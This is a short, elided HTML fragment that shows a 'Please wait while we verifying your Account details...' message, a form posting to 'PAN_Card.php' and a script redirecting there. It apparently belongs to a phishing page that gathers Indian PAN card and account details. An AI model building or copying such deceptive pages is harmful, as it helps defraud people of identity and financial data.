...
<body>
    ...
    <form action="PAN_Card.php" method="post">
        <div id="ha">
            <center>
                <h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verifying your Account details...</h4>
            </center>
        </div>
        <div id="ba">
        ...
        <be><br>
            ...
            <script>
                function myFunction() {
                    window.location.href = "PAN_Card.php";
                }
            </script>
            <!--<div id="bb">
